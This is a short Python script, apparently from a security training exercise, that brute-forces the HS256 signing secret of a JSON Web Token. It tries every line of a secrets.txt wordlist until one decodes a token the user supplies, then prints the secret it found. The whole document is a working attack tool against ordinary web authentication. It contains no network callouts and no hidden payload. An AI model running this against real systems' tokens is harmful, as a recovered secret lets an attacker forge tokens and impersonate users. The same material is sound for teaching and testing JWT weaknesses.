#!/usr/bin/python

import jwt;
from termcolor import colored

print (colored("Script to brute-force JWT secret token",'white'))
encoded = input("Enter encoded payload: ")

#Don't forget to cd into solutions first
with open("secrets.txt") as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print (colored('Success! Token decoded with ....[' + secret.rstrip() + ']','green'))
            break
        except jwt.InvalidTokenError:
            print (colored('Invalid Token .... [' + secret.rstrip() + ']','red'))
        except jwt.ExpiredSignatureError:
            print (colored('Token Expired ....[' + secret.rstrip() + ']','red'))